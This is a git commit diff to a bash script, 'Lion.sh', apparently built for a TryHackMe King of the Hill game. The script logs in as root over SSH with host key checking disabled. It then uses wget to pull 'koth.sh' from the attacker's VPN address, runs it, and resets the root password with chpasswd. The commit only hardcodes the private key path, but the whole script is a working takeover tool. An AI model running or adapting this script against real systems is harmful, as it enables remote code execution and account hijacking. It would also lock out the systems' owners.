3a8ca8d1fe2d0c61add25e14e1aca6a22e48088f
H3X-007 <123769326+H3X-007@users.noreply.github.com>
2023-08-31 18:31:19 +0100

    Update Lion.sh

--- Lion/Lion.sh
+++ Lion/Lion.sh
@@ -1,13 +1,12 @@
 #!/bin/bash
 
 read -p "Enter the machine IP address: " ip_address
-read -p "Enter the id_rsa path: " id_rsa_path
 read -p "Your TryHackMe username: " nick
 read -p "Enter the new password: " password
 
 vpn=$(ip a show dev tun0 | awk '/inet / {print $2}' | cut -d'/' -f1)
 
-ssh -o StrictHostKeychecking=no -i "$id_rsa_path" -p 1337 root@"$ip_address" << EOF
+ssh -o StrictHostKeychecking=no -i id_rsa -p 1337 root@"$ip_address" << EOF
 
 cd /boot && wget http://$vpn/koth.sh && chmod +x koth.sh && ./koth.sh "$vpn" "$nick"
 echo "root:$password" | chpasswd
